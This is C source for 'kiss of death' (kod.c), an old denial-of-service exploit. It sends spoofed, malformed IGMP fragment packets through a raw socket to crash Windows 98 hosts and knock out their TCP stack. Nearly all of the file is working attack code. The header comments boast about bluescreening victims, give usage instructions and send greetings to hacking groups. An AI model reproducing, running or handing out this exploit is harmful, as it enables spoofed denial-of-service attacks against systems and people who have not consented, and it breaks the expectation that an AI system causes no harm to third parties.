
/*
::: kod.c (kiss of death) version 1.2
::: [author] kod.c bug found by klepto /
klepto@levitate.net / rewritten by ignitor / ignitor@EFnet
::: [stuph ] works on bsd/linux/*nix
::: [notes ] bluescreens windows users(98/98se) and kills
tcp stack
::: [m$ bug] windows handles igmp badly and this is the
result
::: [greets]
amputee/nizda/nyt/ignitor/skyline/codelogic/ill`/conio/egotr
ip/TFreak/napster
::: [greets] dist(test monkey)/naz(you rule period.)/#havok/
#irc_addict/#kgb/#eof/everyone
::: [action] ./kod <host> and BEWM!
::: [rant  ] there will be lots of rewrites to this.. just
get our name right!
de omnibus dubitandum
*/

/*
windows core dump output (*whee*)
An exception 0E has occurred at 0028:C14C9212 in VxD VIP
(01) +
00006C72.  This was called from 0028:C183FF54 in VcD PPPMAC
(04) +
000079BR.  It may be possible to continue normally(*not*).
*/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

struct iphdr
{
  unsigned char ihl:4, version:4, tos;
  unsigned short tot_len, id, frag_off;
  unsigned char ttl, protocol;
  unsigned short check;
  unsigned int saddr, daddr;
};

struct igmphdr
{
  unsigned char type, code;
  unsigned short cksum;
  struct in_addr group;
};

unsigned short in_chksum(unsigned short *, int);
long resolve(char *);

long resolve(char *host)
{
  struct hostent *hst;
  long addr;

  hst = gethostbyname(host);
  if (hst == NULL)
    return(-1);

  memcpy(&addr, hst->h_addr, hst->h_length);

  return(addr);
}

int main(int argc, char *argv[])
{
  struct sockaddr_in dst;
  struct iphdr *ip;
  struct igmphdr *igmp;
  long daddr, saddr;
  int s, i=0, c, len;
  char buf[1500];

  if (argc < 3)
  {
    printf("KOD spoofer by Ignitor and klepto\n");
    printf("Usage: %s <src> <dst>\n", *argv);
    return(1);
  }

  daddr = resolve(argv[2]);
  saddr = resolve(argv[1]);

  memset(buf, 0, 1500);
  ip = (struct iphdr *)&buf;
  igmp = (struct igmphdr *)&buf[sizeof(struct iphdr)];

  dst.sin_addr.s_addr = daddr;
  dst.sin_family = AF_INET;

  ip->ihl = 5;
  ip->version = 4;
  ip->tos = 0;
  ip->tot_len = htons(10933);
  ip->id = htons(48648);
  ip->ttl = 64;
  ip->protocol = IPPROTO_IGMP;
  ip->check = in_chksum((unsigned short *)ip, sizeof(struct
iphdr));
  ip->saddr = saddr;
  ip->daddr = daddr;

  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s == -1)
    return(1);

  printf("Sending IGMP packets: %s -> %s\n", argv[1], argv
[2]);

  for (c=0;c<2;c++)
  {
    len = 220;
    ip->frag_off = htons(0x73a);

    for (i=0;;i++)
    {
      if (sendto(s,&buf,len,0,(struct sockaddr *)&dst,sizeof
(struct sockaddr_in)) == -1)
      {
        perror("Error sending packet");
        exit(-1);
      }
      if (ntohs(ip->frag_off) == 0x2000)
        break;
      len = 1500;
      if (!i)
        ip->frag_off = htons(0x2681);
      else
        ip->frag_off = htons(ntohs(ip->frag_off) - 185);

      ip->check = in_chksum((unsigned short *)ip, sizeof
(struct iphdr));
    }
  }

  return(1);
}

unsigned short in_chksum(unsigned short *addr, int len)
{
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;

   while (nleft > 1) {
      sum += *addr++;
      nleft -= 2;
   }

   if (nleft == 1) {
      *(u_char *)(&answer) = *(u_char *)addr;
      sum += answer;
   }

   sum = (sum >> 16) + (sum & 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}

